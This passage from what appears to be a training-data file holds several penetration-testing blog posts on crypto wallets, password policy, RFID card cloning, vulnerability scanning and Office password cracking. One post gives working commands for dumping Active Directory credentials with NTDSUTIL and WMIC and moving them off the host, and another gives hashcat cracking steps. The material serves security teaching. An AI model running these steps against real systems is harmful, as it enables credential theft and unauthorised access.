Exchanges have been hacked before and will again\u2026 Look at Mt. Gox, Blackwallet, Bitthumb, Coincheck, etc\u2026.\nThere are a number of ways to store cryptocurrency in a manner where your private keys are not controlled by someone else. You can install a piece of software on a computer you control, you can store them in what\u2019s called a hardware wallet, and it's even possible to store them on a piece of paper.\nHere is some information about some various ways to store cryptocurrency:\nSoftware Wallet\nYou can download and install a piece of software on a computer you control to interact with your wallet. For example, for Bitcoin there is Bitcoin Core software. This is what is known as a \u201cfull node\u201d meaning that it downloads the entire blockchain to your system and operates as a node on the Bitcoin network.\n\nHaving your wallet local to your computer system using the Bitcoin Core wallet means that your private keys are in your control and not on a third-party exchange. The main problem though is that this requires a lot of storage space for the blockchain (currently over 145 GB!). Another issue with storing coins on a computer locally is that the computer you store them on is still potentially vulnerable to being hacked.\nIf you choose to use this method I recommend using a completely separate computer that is used for nothing other than to sync the blockchain and make transactions. This will limit your exposure to malware that could potentially steal your wallet. Additionally, make sure you encrypt your wallet with a strong passphrase that way in the event your wallet file is stolen it limits the possibility for an attacker to steal your coins. This can easily be done via the interface in Bitcoin Core. Lastly, if you choose to use this method make sure you backup your wallet file. Use an external drive to store your backed up wallet file offline in a secure location.\nKeep in mind that the Bitcoin Core wallet only stores Bitcoin cryptocurrency. For other coins you would have to locate their full node software and perform a similar setup for each one.\nHardware Wallets\nAnother method of storing your cryptocurrency is to use what is known as a hardware wallet. Hardware wallets are specially designed devices that store private keys on them. The private keys are meant to be kept on the devices alone and never touch a computer\u2019s disk thereby limiting the risk of malware affecting them. There are two primary vendors of hardware wallets today: Ledger and Trezor.\n\nLedger wallets and Trezor wallets are hardware devices that allow you to store your private keys on a device other than your computer. Each of these devices allow you to create a pin for accessing your wallets on the device. In order to interact with your coins both of these devices still require a piece of software in order to interact with your wallets. This could be in the form of a Chrome extension or desktop software. The devices are supposed to be able to validate the software is legitimate but there have been some issues with vulnerabilities here.\nEach of these devices create a 24-word backup seed when you initially set them up. This seed is used to recover your wallets in the event that your device is lost or stolen. You could write down your seed, or you could opt for something a bit more solid so that in the event of a fire your seed isn\u2019t destroyed. These devices aren\u2019t perfect but are much less susceptible to malware attacks than if you were to store your wallet on your computer.\nOne important thing to note is that if you are going to purchase a hardware wallet make sure you are purchasing it direct from the vendor and not from a reseller on Ebay or Amazon. This helps limit your exposure to what is known as a \u201csupply-chain attack\u201d.\nPaper Wallets\nAnother option for storing your coins is to use what is called a paper wallet. Essentially, a paper wallet is your private key printed out on paper in QR code form. This prevents the wallet\u2019s private key from being stored digitally in any manner. A paper wallet can be generated using a site like https://bitcoinpaperwallet.com/. After generating the wallet you could transfer your coins to it thereby storing your coins offline in what is known as a \u201ccold wallet\u201d.\n\nThere has been debate about whether this option is actually more secure than using a hardware wallet or not due to the fact you still have to generate the keys on a computer that is potentially prone to malware.\nIf you decide to go this route I\u2019d recommend performing the following actions in order to minimize risk of having your private keys stolen:\n\nBoot a computer from a USB using a Linux operating system such as Ubuntu.\nDon\u2019t use the web version of the Bitcoin paper wallet generator. Instead, download the offline wallet generator: https://github.com/cantonbecker/bitcoinpaperwallet\nDisconnect from any network\nGenerate your paper wallet\nPrint it out\n\nConclusion\nSecuring cryptocurrency is a vastly important area and will continue to grow in the near future. Myself, Mike Felch, Steve Borosh, and Ralph May do a weekly podcast called the CoinSec Podcast that is meant to address security issues in cryptocurrencies and blockchain technologies. If you are interested in the security aspects of cryptocurrency be sure to check out the CoinSec Podcast. You can also follow us on Twitter at @CoinSecPodcast to get all the latest cryptocurrency security news.\n\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"An Open Letter about Big All-Powerful Companys Password Policy\"\nTaxonomies: \"Informational, bad passwords, long passwords, password policy, passwords\"\nCreation Date: \"Thu, 19 Apr 2018 15:09:33 +0000\"\nKelsey Bellew //\n\nDear Big All-Powerful Company,\nYour idea of a \u2018strong password\u2019 is flawed.\nWhen I first saw the following message, I laughed. I said out loud, \u201cNo, you have not seen that password before, ever; I guarantee it,\u201d but I moved on.\n\nI thought, no big deal, I\u2019ll add some length.\nAnd then adding length didn\u2019t work.\n\nYou\u2019re telling me you\u2019ve seen the password I thought up just now, with a character length of THIRTY-SEVEN characters and a complexity of four, \u201ctoo many times\u201d. Really??\nMore length?\n\nOH YOU HAVE, HAVE YOU?\nAre you flagging dictionary words? You have to be flagging dictionary words. What is your password policy, even??\n\nSo, at least eight characters, complexity of three; check. Big All-Powerful Company\u2026.. why??\nYou don\u2019t allow Spring18 under the condition of \u2018We\u2019ve seen that password too many times before\u2019, but Spr1ng18 is fine, huh?\nAnd then I found out, you\u2019re not flagging ALL dictionary words (just months and your company name, maybe?) when I looked at password policy in the Change Password page. There I was told that my password needed to be at least eight characters, a complexity of three and - oh look, no longer than 16 characters.\nYou mean to tell me that you consider a password that doesn\u2019t fit within the bounds your text box is both \u2018too long\u2019 and \u2018weak\u2019.\n\nReally.\nFor anyone who has a similar misconception, please review the following:\n\nAlso, here are a couple blog posts we\u2019ve written that go further into depth as to why allowing passwords like Spr1ng18 is a bad idea and how to create better passwords:\nHow to Increase the Minimum Character Password Length (15+) Policies in Active Directory\n10 Ways to Protect Your Online Digital Life\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"New Toy Alert: A Quick Review of Keysy\"\nTaxonomies: \"Fun & Games, Informational, Physical, Keysy, Physical Pentest, Physical Pentesting, RFID, tools\"\nCreation Date: \"Thu, 05 Apr 2018 15:47:46 +0000\"\nRick Wisser//\n\nHere at BHIS we are always on the lookout for new toys. Especially if we can use them during a pentest. As a pentester, we all have a complimentary tool set in our jump bags that we have grown accustomed to using. Tools such as the Rubber Ducky, Konboot, Lan Turtle, proxmark3, crowbar (try getting that past TSA), etc are utilized in certain capacities depending on the situation we find ourselves in during a physical assessment. Like a group of little kids when we find something exciting we share it with everyone and of course everyone wants one as well.\n\nI was chatting with Brian Fehrman several mouths back and he was telling me about this new Kickstarter campaign called Keysy by TINYLABS. I immediately went and checked it out and ended up backing the project. Keysy is described as a device that can store, replay and clone RFID key cards and key fobs from one device. I had actually forgot about it until I received them earlier this week. Therefore lets do a quick review blog post about it.\n\nWhen I signed up to back the project I choose the $40.00 option at the time and by doing so I would receive two devices. The devices came packaged together in one box and each had their own retail like packaging.\n\nPackaging Front and Back\n\nI noticed that on the back of the packaging it states that the device is compatible with most 125kHz RFID. Therefore, this device will work only with Low Frequency RFID cards. High, Ultra High and Microwave Frequency cards operate at higher frequencies.\n\nHere is a breakdown of the types of cards and their frequencies:\n\nLow Frequency (LF):                     120-1355 KHz  (HID Prox, EM, Nedap NeXS)\n\nHigh Frequency (HF):                    13.56MHz   (MIFARE Classic, DESfire, HID iCLASS, Legic)\n\nUltra High Frequency (UHF):       860-980 MHz  (RAIN RFID/EPC Gen 2)\n\nMicrowave:                                    2.45 GHz +   (Nedap TRANSIT)             \n\nIncluded in each package was the Keysy device along with instructions, a note and a rewritable RFID fob.\n\nContents of Keysy Package\n\n The note reads:\n\n\u201cDue to inconsistencies between different RFID readers as well as the small geometry of the Keysy antenna it is not possible for Keysy tag emulation to work with every reader. Keysy tag emulation as been tested and works well with the majority of commercial readers. In the cases where Keysy emulation doesn\u2019t work, Keysy and the included rewritable RFID tag can still be used to make a duplicate copy of the original tag. Please see instructions for additional information on cloning tags.\u201d\n\nUsing Keysy\n\nI followed the instructions by first trying to read an iCLASS card into Keysy. As I had expected the card was not able to be read by Keysy. This is because iCLASS cards operate at a frequency outside of Keysy\u2019s intended use.\n\niCLASS Card Read Failure\n\nI then grabbed my local recreation center card, which is a HID Prox card and attempted to read that with the Keysy device.\n\nHID Prox Card Successful Read\n\nThe card was read successfully with the indication of the green light. The instructions also stated that to confirm you got a successful capture you can push the button on the remote and a the green LED should turn on. I did as instructed and got the green LED.\n\n The following are observations that I found during reading the card with the Keysy device:\n\nTo copy an RFID card into the device you have to have Keysy in very close proximity to the card. I tested to see how far Keysy could be away from the card to get a successful read. By my observations I had to hold Keysy within an inch of the card to get a successful read.\n\nIt takes about 17 to 20 seconds to read the RFID card.\n\nI also successfully wrote the captured data to the included RFID fob. The instructions said to hold Keysy against the fob and press the button that I programmed the card into 5 times sequentially. The clone was found to be successful by observing the Keysy LED flash three times\n\nKeysy Write to Key Fob Successful\n\nKeysy Angle to Reader\n\nNow it was time to try it out at my local recreation center. First, I attempted to use the Keysy to replay the RFID card and found that it was successful. I had to play with it a little to point it in the sweet spot of the reader. I found that it worked best if you held it at a slight angle as shown below.\n\nI then utilized the cloned key fob and found that it worked just as a regular card would.\n\nI could definitely see this being utilized during a pentest to capture or clone a card but due to how close you must be and the time it takes to read the card it might not fit every situation as other devices might.\n\nEvaluating this device from a blue team prospective I can see issues with individuals being able to clone or make copies of their cards. I have listed them below:\n\nSomeone clones the card for a friend and also is able to make a copy for themselves.\n\nSomeone clones their own card(s) and loses one of them or the original without informing the security staff.\n\nSomeone with access to your Keysy can make a copy if they have a writable card or fob.\n\nFrom my testing I found Keysy to be a very cool device for what it is intended for. It seems to be solid and works as advertised. I could see myself using this if I had several RFID cards that were compatible. In fact, I will probably just utilize my RFID fob for access to my recreation center since I can just put it on my keyring.\n\nI think that it might be preemptive for the personnel in charge of low-frequency building access controls to start educating employees and creating policies and procedures around duplication or RFID cards or utilization of devices like Keysy.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"What to Expect from a Vulnerability Scan\"\nTaxonomies: \"Informational, Nessus, pentest, Pentesting, Vulnerability Scanning, vulnerability scans\"\nCreation Date: \"Thu, 12 Apr 2018 15:53:20 +0000\"\nDakota Nelson//\n\nFor a lot of our customers, their first introduction to pentesting is a vulnerability scan from BHIS. This is after talking to the testers, of course, and setting up rules of engagement, sharing which hosts are within scope, and talking over how we, as testers here at BHIS, can best help secure their environment. But still - this is the first time the rubber meets the road, and it can make people understandably nervous. What is a scan, anyway? Will it crash things? Do we need to run it at night or on a weekend? We field a lot of these questions, and this post is here to help you get an idea of why we do these scans and what you can expect. Make sure you\u2019re comfortable, and let\u2019s get started.\n\nFirst, an intro to vulnerability scans. As you may have noticed from our new homepage redesign at https://www.blackhillsinfosec.com/, we frequently compare penetration tests to climbing a mountain, with our ultimate objective - the \u201ccrown jewels\u201d of an organization - at the top. You can climb a mountain by just walking up to it and starting, of course, but you\u2019re probably going to have a rough time of it, frequently making it part way up before you realize you\u2019ve taken a bad route, climbing back down, and starting over. In this world, a vulnerability scan is a map of the mountain - not a perfect one, but better than nothing. Using this map, the testers here at BHIS can be your adventure guides - we can plan routes up, make sure to fully explore the mountain, find hidden crevices and caves, and do it all much faster than if we were to just start climbing.\n\nHere at BHIS, we generally use Nessus for our scans. A quick skim through the Nessus propaganda gives you some idea of why - Tenable (the company behind Nessus) claims that over 24,000 organizations around the world use Nessus, and I believe them. When we launch scans, we do so with a finely-tuned policy based on the PCI standard scan, the same one used by thousands upon thousands of others - they\u2019re called PCI standards for a reason. What does this mean for you? It means you\u2019re not going to have anything weird slamming your network. No DoS attacks, no bruteforcing passwords, and so on. We like to get creative in our tests, but an automated vulnerability scan is not the place to do it. Creativity is for humans. Sorry, robots.\n\nI asked the testers at BHIS for their most out-there Nessus stories, and got very little despite decades of cumulative experience regularly running these scans. The short of it is that anything that Nessus breaks must be so fragile that you should reconsider it being on your production network at all.\nHere\u2019s what John has to say, after hundreds of tests over many years:\n\nTesters, please share a list of any system/service that crashed in a test.\nI will start.\n1. Killed a switch in 2003.\n2. Submitted emails...  Lots of emails to some open contact email page.  This has happened on a number of different customers.  It is also not specific to Nessus, but to any web scanner/crawler.\n3. Um...  Ahh... Might be getting old.....\n\nI did hear a couple of stories along the lines of, \u201cWell, we hit the customer with a scan and they had their monitoring set up to alert on so many things that the SOC lit up like the 4th of July and the alert traffic brought down their network.\u201d That\u2019s certainly bad, but also\u2026 if your IDS is set that aggressively, I mostly feel bad for the analysts who have to sift through all that noise. This is a vulnerability in itself, and a good one to know about!\n\nOther than that, everything we know is hearsay. I\u2019ve heard legends of printers spewing page after page with cryptic packets printed on them (rumors that anyone who reads the pages in their entirety gains eldritch networking powers are entirely unfounded), or of SCADA systems crashing, but nobody at BHIS has seen this firsthand. The closest we got was David Fletcher, who told a story of HID physical access controllers on a production network which stopped responding to the connected card readers after being scanned and needed to be rebooted. It turned out, though, that these same controllers had default hard-coded credentials which couldn\u2019t be changed and cached the last read from each connected card reader on their web interface, which allowed anyone to impersonate anyone else by just grabbing these cached scans.\nThese are the sorts of issues we see - if Nessus breaks it, it\u2019s a good sign that something is very, very wrong. We tune our Nessus scan policy to avoid these issues (ignoring printers, skipping SCADA systems), and I want to underscore that despite decades of combined experience running these scans, here at BHIS we very rarely see anything break because of a scan.\nAt the end of the day, BHIS is here to help you secure the mountain that is your organization, and the map generated by Nessus is a great help to us (and you!) in doing so. We can work without it, but we\u2019ll be climbing blind, and a lot slower because of it. If you have any concerns about scanning your network, just chat with your tester about it - we\u2019ve seen a lot, and it\u2019s our job to guide you through your test, whether it's your first or your hundredth.\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Small and Medium Business Security Strategies: Part 4\"\nTaxonomies: \"Author, Blue Team, How-To, Informational, InfoSec 101, Jordan Drysdale, Critical Controls, Jordan Drysdale, Medium Business, Security Stratigies, Small Business, Vulnerability Management\"\nCreation Date: \"Thu, 26 Apr 2018 15:21:19 +0000\"\nJordan Drysdale//\n\ntl;dr\nVulnerability management is a part of doing business and operating on the public internet these days. Include training as part of this Critical Control. Users should be aware that attacks will continue to evolve and clicking links isn\u2019t the only way to get infected these days. Hire a managed services provider worth their salt and let them manage these things for you.\nCSC 3 - Vulnerability Management\nCritical Controls - \u201cThe Easy Five\u201d just became the \u201cEasy Six\u201d\nThe \u201ceasy\u201d six review:\n\nHardware Inventory\nSoftware Inventory\nVulnerability Management\nControlled Admin Privileges\nSecure Configurations for Domain Systems\nLogging Controls\n\nSo, are we there yet?\n\nKinda. We\u2019re actually almost half way. So, what is vulnerability management? It depends\u2026According to SecureWorks, vulnerability management is a drain on your security team.\n\nWhat we\u2019re talking about here is a bit more nuanced than that. I\u2019ll define a vulnerability (under this context) as an identified or published flaw that can be tested and validated using various software toolkits generally available. Now, let\u2019s be clear, not all vulnerabilities can be identified with current \u201cscanner tools.\u201d For example, OWA. If your company exposes Outlook Web Access to the public internet, this is a vulnerability. To pentesters, OWA is a gold mine of potential. LinkedIn profiles, Twitter, Facebook\u2026.if your employees are here, this is also a vulnerability of sorts.\nSo, with that out of the way, how does a small business assess its vulnerabilities and manage them? Owning and maintaining licenses for Nexpose, Nessus, Qualys, et al\u2026.is basically out of the question. This point harkens back to the use of managed service providers.\nBullet points for vetting a third-party service provider:\n\nIf you don't know, you can ask someone who does\nStamp of approval of some kind (SSAE-16, SOC) to operate securely\nReasonable cost - quarterly scans and directed guidance against your few IP addresses should be in the range of five thousand bucks a year (or less, in my opinion)\n\nLet\u2019s take a step back here and ask if a managed service provider makes sense to coordinate all IT efforts at our organization. The ROI of adding a managed service provider for 30 systems, servers, network gear, vulnerability scans, and a managed help desk of some kind at around $2000 - $2500 should make sense. It is rare these days that a single human resource (employee) can come in to an organization and manage the complexities of even a small network. Those individuals also come with the benefits and salary price tag that make the ROI of paying an MSSP much more reasonable.\nNow your organization is ready to mobilize and actually run some vulnerability scans. Companies running their first vulnerability scans, whether inside or outside their networks are often surprised to hear their networks are an absolute mess. Like this:\n\nUnder contracted efforts, BHIS would gently urge customers to review the policies and procedures surrounding systems management, patching, and updates most specifically. If you were previously under the protection of a managed IT provider, it is time to pull the plug. If this output is the result of their first contact with your network, give their efforts another quarter.\nThanks for reading this far, cheers!\nFor Parts 1-3:\nhttps://www.blackhillsinfosec.com/small-medium-business-security-strategies-part-1-introduction/\nhttps://www.blackhillsinfosec.com/small-medium-business-security-strategies-part-2-inventory/\nhttps://www.blackhillsinfosec.com/small-and-medium-business-security-strategies-part-3-inventory-part-2-software/\nExternal Links\nRef: https://www.cisecurity.org/controls/\nRef: http://www.onlinetech.com/resources/references/data-center-standards-cheat-sheet-from-hipaa-to-soc-2\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Got Privs? Crack Those Hashes!\"\nTaxonomies: \"Author, Joff Thyer, Red Team, Red Team Tools, Crack Hashes, Joff Thyer\"\nCreation Date: \"Thu, 03 May 2018 15:06:55 +0000\"\nJoff Thyer //\n\nBlack Hills Information Security loves performing both internal penetration tests, as well as command and control testing for our customers. Thanks to the efforts of many great researchers in the industry, we are lucky enough to escalate privileges in many environments, laterally move, and demonstrate access to sensitive data.\n\nAs a penetration tester, we must always have the mindset of demonstrating business risk as the number one goal. Thus I find myself often saying things like \u201cDomain Admin\u201d in the Windows Active Directory world are not everything. In fact, in support of this idea, there have been many occasions whereby I have managed to move laterally within an environment because of enumerated/discovered local administrative privileges and even used token impersonation exclusively to mimic a normal business user with the goal of demonstrating access to data. Did I need to grab that domain admin privilege for this? Well not at all. Do these sorts of actions scare the daylights out of business executives that are trying to guard the crown jewels? You bet it does!!\n\nGaining local privilege escalation is something we often achieve through any number of methods including:\n\nMis-configured service accounts\n\nUnquoted service path names\n\nUnattended installation XML files\n\nGroup policy preferences XML files\n\nDLL hijacking\n\nThe \u201calways elevate\u201d registry key for MSI installations\n\nKerberoasting - thank you, Tim Medin!!!\n\nPassword spraying\n\nIn recent tests, I have found that Kerberoasting remains very fruitful but in unusual ways. One attack path I have found interesting is to spray for passwords that you first discover through Kerberoasting or other local machine escalation. It is amazing how many times that Systems Admins will reuse passwords and not be cognizant that password reuse across different privileged accounts is a really bad idea.\n\nAll that said, let's just face it, there is nothing better than the thrill of finally getting full domain administrative access. While it does not demonstrate business risk directly, it sure makes you feel a little tingle followed by your happy little \u201cgot root\u201d dance. (Yes, admit it\u2026 you all have a \u201cgot root\u201d dance). My lovely wife always knows when I hit the jackpot because my office is next to the kitchen, and I cackle loudly when it happens.\n\nOk, so after you get that Domain Admin account through whatever means, there are so many things you can do. Among these is performing the \u201cvalue-added service\u201d of grabbing the full domain account hashes, and letting your \u201chashcat\u201d flag fly in all its glory. Yes, crack those hashes and see just what percentage of all the creds you can actually obtain. In the process of doing so, you will turn your rockin\u2019 video GPU water-cooled cracking masterpiece into a small space heater while using about 3,000 watts of electricity over a couple of days\u2026 but oh the wonderful beauty of the result! Of course, when you are finished you should use Carrie\u2019s Domain Password Audit Tool to produce a beautifully formatted HTML report. It is not unusual to obtain figures such as over 70% of hashes cracked in any one organization.\n\nNow I will get to the point\u2026 extracting the hashes can be dangerous!!! Why do you ask? Well, many of us in the bad old days are accustomed to using either \u201chashdump\u201d, or \u201csmart_hashdump\u201d (thanks Carlos\u2026 https://www.darkoperator.com/blog/2011/5/19/metasploit-post-module-smart_hashdump.html) in the Metasploit project. While these are lovely, well-written pieces of software, both approaches on a Domain Controller will try to extract hashes from the LSASS.EXE process. Within a small environment, you will probably be just fine. However, there are times when you are operating within an environment of 20,000 - 100,000 credentials or more. If you muck around with LSASS.EXE in this sized environment, you will likely crash a domain controller, and that is sub-optimal.\n\nHow do we handle this situation? It would be really nice if we could gain access to the NTDS.DIT, SAM, and SYSTEM files directly and just copy the data down. This works well because the folks at Core Security have a Python script called \u201csecretsdump.py\u201d within the Impacket repository giving us the ability to grab the hashes directly from the database, and registry files.\n\nNext question is\u2026 how on earth do we gain access to these files? On a running domain controller, they are locked files, so you can\u2019t just romp on into the \u201c%SYSTEMROOT%\\SYSTEM32\u201d directory and copy the files. Well, not technically true, you can find backups of SAM, and SYSTEM in the \u201c%SYSTEMROOT%\\SYSTEM32\\CONFIG\u201d directory, and it might well be possible to locate the files in a Volume Shadow Copy. Alas, even if you do locate these files, they will be old by perhaps a day or a week.\n\nThere happens to be a fantastic tool located on a Windows domain controller called \u201cNTDSUTIL.EXE\u201d. The NTDSUTIL tool is used for accessing and managing a Windows active directory database. The tool should typically only be used by experienced system administrators, but also has this wonderful penetration testing use case.\n\n WARNING: This tool is POWERFUL. Do not experiment ad-hoc with NTDSUTIL unless using your own lab system. It will directly interact with Active Directory databases, and you might well destroy the domain. \n\nThe nice part about NTDSUTIL from a penetration testing perspective is that you can create a full active directory backup in \u201cIFM\u201d media mode in a completely safe manner. Once you do this, all that is left is to copy the files to where you need them for hash extraction and cracking purposes. The upside of this method is a safe, and relatively stealthy method of grabbing the data for your \u201cvalue-added service\u201d of cracking the hashes. The downside of this method is that some Active Directory Databases are sizeable, often several hundreds of megabytes or gigabytes in size. In general, I have found that ex-filtration works fairly well if you created an encrypted ZIP, base64 encode and then download the result.\n\nSpecifically, when using NTDSUTIL we are doing the following:\n\nSetting the active instance to \u201cNTDS\u201d\n\nEntering \u201cIFM\u201d media creation mode\n\nCreating a full backup to a specified directory path\n\nQuitting out of IFM, and then quitting from NTDSUTIL\n\nNTDSUTIL is normally a text menu-driven process, however, it is possible to specify each of the commands directly on the command line from CMD.EXE as follows:\n\nC:\\> ntdsutil \u201cac in ntds\u201d \u201cifm\u201d \u201ccr fu c:\\TEMP\\AD\u201d q q\n\nThe most important thing to realize is that the \u201cC:\\TEMP\\AD\u201d directory specified above must exist, must be an empty directory, and must have enough free disk space to hold the full database. The other important thing is that you must have an administrative account in order to perform this operation.\n\nIn general, I prefer to not use Remote Desktop Protocol but rather use WMIC to launch the required NTDSUTIL command. One of the challenges with this is you end up with the age-old quotation escaping challenge in crafting your command.\n\nLet\u2019s assume your target domain controller is 10.10.10.10. What you can do is map a drive to the domain controller, create your directory to store the results, and invoke WMIC to run your NTDSUTIL command.\n\nA command sequence as follows should do the trick assuming you are resident on a regular workstation within the environment.\n\nC:\\> NET USE Z: \\\\10.10.10.10\\C$ /USER:DOMAIN\\Administrator C:\\> MKDIR Z:\\TEMP\\AD C:\\> WMIC /NODE:10.10.10.10 /USER:DOMAIN\\Administrator /PASSWORD:XXXXX process call create \"cmd.exe /c \\\"ntdsutil \\\"ac in ntds\\\" \\\"ifm\\\" \\\"cr fu c:\\TEMP\\AD\\\" q q\\\u201d\" \n\nYou can check on the progress using the command while NTDSUTIL completes. It may take a while especially if the active directory environment is large.\n\nC:\\> DIR /S Z:\\TEMP\\AD \n\nAfter this completes, your job is to compress the resulting files (SYSTEM, SAM, and NTDS.DIT) using ZIP with encryption, optionally base64 encode, and download the results to a Linux system you control.\n\nThe IMPACKET secretsdump script can then be used to extract all hashes in a format suitable for cracking with \u201chashcat\u201d as follows:\n\n$ python secretsdump.py -system SYSTEM -security SECURITY -ntds NTDS.DIT -outputfile outputfilename LOCAL \n\nAfter you have successfully exfiltrated the data, please ensure that you clean up your mess on the domain controller itself. I would suggest doing the following:\n\nC:\\> Z: Z:\\> CD \\TEMP\\AD Z:\\TEMP\\AD> RD /S /Q \u201cActive Directory\u201d Z:\\TEMP\\AD> RD /S /Q \u201cRegistry\u201d Z:\\> C: C:\\> NET USE Z: /DELETE \n\nIf you have sufficient drive space on the local workstation you are working with, another option is to create a share from your system, and mount that share on the domain controller. Subsequently, you would create an empty directory on this share, and use a similar NTDSUTIL command to create the backup of the database with this path.\n\nThe greatest advantage of following this sort of methodology when extracting hashes is that you are NOT endangering the LSASS.EXE process via any DLL injection, and thus not risking a domain controller crash.\n\nAnother potential method to use is to abuse domain controller replication functionality with \u201cDCSYNC\u201d. If you would like to read about this, please refer to Harm Joy\u2019s blog at http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/.\n\nHappy hunting folks.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Crack Office Passwords with a Dictionary\"\nTaxonomies: \"Author, External/Internal, How-To, Kent Ickler, Password Cracking, AES, CeWL, decrypt, dictionary, encryption, Exce, Hashcat, John the Ripper, JTR, Kent Ickler, LinkedIn, microsoft office, Office, SHA, wordlist\"\nCreation Date: \"Thu, 10 May 2018 15:59:16 +0000\"\nKent Ickler//\n\nTLDR: We use a custom dictionary to crack Microsoft Office document encryption.  Then we use a custom dictionary for pwnage in LinkedIn hash database.\n\nBackground:\n\nI recently got a couple of questions about a better way to crack encrypted Excel files.  The question came from BHIS\u2019s extended community who is using commercial password-recovery tools with distributed CPU and GPU processing power.  The problem is they were still getting ridiculously slow hashing speeds making brute force unfitting.\n\nIn discussing our typical run-down of hashing on John the Ripper (JTR) and Hashcat, the user responded with \u201cI used that 15 years ago\u2026 people still do that\u201d?  \n\nYes\u2026 Yes, we still do that.\n\nIn fact, both JTR and Hashcat have active development to this day.\n\nTo be fair, I can\u2019t say if a commercial software is faster (better, faster, stronger), but I will say that if it includes professional support and you\u2019re dealing with something complicated, that's always nice to have.  There's a mantra that Black Hills Information Security SysAdmins have: we are neither pro-proprietary nor pro-open source; we are pro-security awareness.  Commercial software definitely can have its niche and a quick survey of Password Recovery software shows some interesting offerings, especially regarding distributed workloads that the open-source community has struggled to find significant growth.\n\nOffice Encryption:\n\nThe slow hash-cracking is the result of efforts the Microsoft Office application puts into storing the password hash and encrypting the document. The encryption methods are far more complex than they used to be in earlier Office versions. Office 2013 encryption uses 128-bit AES using SHA-512 algorithm.  The more processing power used to create the hash, the harder it is to attempt multiple combinations to find that matching hash.  \n\nFuture Research:\n\nInterestingly, Microsoft also left a backdoor in all Office 2013 encrypted documents that allowed the use of a Master Key.  Microsoft even made DocRecrypt Tool that would allow an IT Admin to decrypt or re-crypt an Office document without the original password by using certificate-signing services on the domain.  These and other attack vectors have been researched by the community and could yield potential attack vectors that may entirely circumvent hash-cracking encrypted documents altogether.\n\nSetup the Encrypted Document:\n\nFirst, I\u2019ve created an Excel document and filled it with some fictitious data.\n\nNow, I\u2019m going to \u201cEncrypt with a Password\u201d\n\nLet's try to use a password I figure might be in a common dictionary somewhere: buckeye31. \n\n(side note, I used \u201cshuf -n 1 rockyou.txt\u201d)\n\nAfter saving the document, I try to open it again to verify its encrypted.\n\nWe don\u2019t want to actually crack the Excel file itself-- we just want to crack the hash of the password that was used to encrypt the Excel file.   To do this, we need a tool that will read the Excel file, and deliver us a plaintext-hash of the password used in the encryption processing of the file.  Now, typically I\u2019d refer to Hashcat-Utils, but, the tool I need isn\u2019t there.  Since we also have JTR compiled on the same cracking system, I\u2019m going to use JTR\u2019s office2john.py.\n\nOffice2john.py [EXCEL FILE] > hash.txt\n\nOffice2John.py identified the hash and determined it\u2019s using MS Office 2013\u2019s encryption method, so despite using Office 2016 it looks like the hash mechanism is still the same.  I could use JTR here on out, but I\u2019m still partial to Hashcat, despite having to look up the Hash-type code that I otherwise wouldn\u2019t have to if I just used JTR.  I\u2019ll need to cut the JTR Office 2013 hash into something that Hashcat will understand and I\u2019ll need to find the Hash method code from Hashcat\u2019s help file.\n\nTo convert this JTR formatted string so Hashcat can read it properly, I need to remove the leading \u201cEncryptedBook.xlsx\u201d from the line created by office2john.py. We could use Hashcat\u2019s --username flag, but I prefer to create a clean hash-list file.  So I\u2019ll use cut:\n\nCut hash.txt -d\u201d:\u201d -f 2 >hashhc.txt\n\nNow, let's give Hashcat some context:\n\nWith hashcat64.bin --help I can find that the Hast method code for Office 2013 is 9600\n\nReal quick, I want to check the benchmark for the 9600 hashing method on our HashCat rig:\n\nHashcat64.bin -m 9600 -b\n\n47,178 h/sec isn\u2019t great, but it sure beats a few hundred.\n\nNow, the password I used is in rockyou.txt ( I did, in fact, pull it out randomly from that file). Let's see how big our rockyou.txt is:\n\n14,344,393.  Not counting overhead, that\u2019s somewhere around 5 minutes.  \n\nShoot, let's go:\n\nhashcat64.bin -m 9600 hasheshc.txt /opt/wordlists/rockyou.txt -o hashes.pot\n\nFour minutes later\u2026\n\nNot surprising, the password was found in rockyou.txt.\n\nBut what if we just knew it had some lowercase-letters followed by a couple of numbers?\n\nhashcat64.bin -m 9600 -a 3 hasheshc.txt ?l?l?l?l?l?l?d?d -o hashes.pot\n\nSEVEN days.  Wow, ouch.\n\nWait\u2026 what if we just knew it was 8 characters but knew nothing else?\n\nhashcat64.bin -m 9600 -a 3 hasheshc.txt ?a?a?a?a?a?a?a?a -o hashes.pot\n\nWell then.\n\nPoint is you can save yourself about 4577 years if you use a dictionary, or... an 8 character alphanumeric password is pretty good for MS Office encryption, apparently.\n\nWhat about a different approach?\n\nI\u2019m not a big football fan, but if I knew the author of the Excel file was, I might try to build a custom dictionary.  I\u2019ll use cewl to look for keywords about College Football on this Wikipedia page to help me build a dictionary file.\n\ncewl --depth 0 -w customdict.txt https://en.wikipedia.org/wiki/List_of_college_team_nicknames_in_the_United_States\n\nThis generated a custom dictionary of 1626 words.\n\nLet's add all UPPER and lower in there too:\n\ncp customdict.txt customdict.more.txt\n\ncat customdict.txt | tr \u2018[:upper:]\u2019 \u2018[:lower:]\u2019 >> customdict.more.txt\n\ncat customdict.txt | tr \u2018[:lower:]\u2019 \u2018[:upper:]\u2019 >> customdict.more.txt\n\nNow we\u2019re at 4878 words.\n\nLet's go a bit farther and run hashcat-utils expander to expand out all those words.\n\n(Note, I had to recompile expander to expand out to 8 characters\u2026)\n\ncat customdict.more.txt | /opt/hashcat-utils/src/expander.bin > customdict.more.expanded.txt\n\n392,322 words.  Now what?  \n\nNow, let's add a couple of numbers at the end of the wordlist using hashcat\u2019s hybrid wordlist attack:\n\nhashcat64.bin --session HashBlog1 -a 6 -m 9600 hashhc.txt customdict.more.expanded.txt ?d?d -o hash.pot\n\nAND\u2026\n\nIn 27 seconds we had a winner.  \n\nDictionaries are where it is at for process-intensive hashes.\n\nIf you\u2019re like most people and not using random alphanumerics and symbols, anything someone knows about you, including your sports preferences, could be used in a word list to cut downtime cracking passwords only you (think you) know.\n\nHold on, this was all fictitious and you knew the password to begin with. No one would actually use those passwords...\n\nJust for fun, let's test our custom.more.expanded.txt word dictionary across a known hash-release of the LinkedIn ~60M hash release.  Since it uses 